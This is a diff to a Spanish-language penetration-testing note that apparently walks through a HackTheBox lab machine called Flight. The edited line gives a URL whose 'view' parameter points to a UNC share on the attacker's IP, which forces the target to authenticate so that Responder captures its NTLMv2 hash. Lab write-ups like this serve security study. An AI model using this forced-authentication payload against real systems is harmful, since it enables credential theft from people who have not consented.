@@ -101,8 +101,9 @@ vamos a iniciar el responder para posteriormente hacer una petición e intentar 
 ![[Pasted image 20240810125124.png]]
 
 `hash NTLMv2`
-ahora solo vamos a forzar la autenticación contra los recursos compartidos de nuestra maquina atacante navegando a esta dirección `http://school.flight.htb/index.php?view=//10.10.14.8/share` de esta manera la maquina se autentica contra nosotros y podemos capturar el hash
+ahora solo vamos a forzar la autenticación contra los recursos compartidos de nuestra maquina atacante navegando a esta dirección `http://school.flight.htb/index.php?view=//10.10.14.8/share` de esta manera la maquina se autentica contra nosotros y podemos capturar el `hash NTLMv2`
 ![[Pasted image 20240810125817.png]]
+
 
 
 
